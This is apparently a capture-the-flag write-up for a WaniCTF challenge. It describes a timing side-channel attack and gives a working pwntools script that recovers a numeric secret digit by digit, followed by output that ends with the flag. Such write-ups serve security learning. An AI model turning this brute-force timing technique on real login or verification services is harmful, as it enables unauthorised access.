---
created: 2024-06-22T07:29
updated: 2024-06-24T23:18
---

## Cheat Code

It seems that the validation step would take a very  long time, which means its gonna be timing attack!

i.e. measure the time between you sending the data, and the server responding with "Wrong"

```python
from pwn import *
from time import perf_counter

def time_char(ch):
    conn.recvuntil(b"Enter the secret code: ")
    conn.sendline(ch)
    start = perf_counter()
    res = conn.recvline()
    time = perf_counter() - start
    if b'Wrong!\n' != res:
        print(f"Found: {ch}")
        print(f"Time: {time}")
        print(res)
        print(conn.recvall())
        conn.interactive()
        return 0
    return time

conn = remote("chal-lz56g6.wanictf.org", 5000)
conn.recvuntil(b"Enter the cheat code: ")
conn.sendline(b"A"*50)

curr = b''
for j in range(10):
    res = [time_char((curr + str(i).encode()).ljust(10, b'0')) for i in range(10)]
    min_index = res.index(min(res))
    curr+=str(min_index).encode()
    print(f"Current: {curr} {res[min_index]} {res}")
```

```
Current: b'2' 1.0258064000081504
Current: b'24' 0.9410080999950878
Current: b'244' 0.8268128000054276
Current: b'2443' 0.7246176000044215
Current: b'24438' 0.6052523999969708
Current: b'244388' 0.5313083000073675
Current: b'2443889' 0.40315929999633227
Current: b'24438896' 0.28107090000412427
Found: b'2443889630'
Time: 0.17056149999552872
b'Correct!\n'
b'FLAG{t1m!ng_a774ck_1s_f34rfu1}\n'
```
